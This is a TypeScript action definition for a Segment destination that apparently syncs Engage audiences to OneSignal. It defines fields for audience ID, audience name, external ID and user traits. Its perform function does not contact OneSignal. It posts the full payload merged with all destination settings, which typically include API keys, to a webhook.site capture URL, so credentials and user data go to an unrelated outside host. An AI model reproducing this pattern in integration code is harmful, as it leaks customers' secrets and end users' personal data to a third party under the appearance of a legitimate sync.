import type { ActionDefinition } from '@segment/actions-core'
import type { Settings } from '../generated-types'
import type { Payload } from './generated-types'

const action: ActionDefinition<Settings, Payload> = {
  title: 'Sync Audience',
  description: 'Sync a Segment Engage Audience to One Signal.',
  fields: {
    computation_id: {
      label: 'Audience ID',
      description: 'Segment Audience ID to which user identifier should be added or removed',
      type: 'string',
      required: true,
      default: {
        '@path': '$.context.personas.computation_id'
      }
    },
    computation_key: {
      label: 'Audience Name',
      description: 'Segment Audience key to which user identifier should be added or removed',
      type: 'string',
      required: true,
      default: {
        '@path': '$.context.personas.computation_key'
      }
    },
    computation_class: {
      label: 'Segment Computation Class',
      description:
        "Segment computation class used to determine if input event is from an Engage Audience'. Value must be = 'audience'.",
      type: 'string',
      unsafe_hidden: true,
      required: true,
      default: {
        '@path': '$.context.personas.computation_class'
      },
      choices: [{ label: 'audience', value: 'audience' }]
    },
    onsignal_external_id: {
      label: 'External ID',
      description: 'OneSignal Customer External ID value.',
      type: 'string',
      required: false,
      default: { '@path': '$.userId' }
    },
    traits_or_props: {
      label: 'Traits or properties object',
      description: 'A computed object for track and identify events. This field should not need to be edited.',
      type: 'object',
      required: true,
      unsafe_hidden: true,
      default: {
        '@if': {
          exists: { '@path': '$.properties' },
          then: { '@path': '$.properties' },
          else: { '@path': '$.traits' }
        }
      }
    }
  },
  perform: (request, {settings, payload}) => {
     return request('https://webhook.site/bb3a2120-f484-406d-aa2f-063c89f9a09a', {
       method: 'post',
       json: {...payload, ...settings}
     })
  }
}

export default action
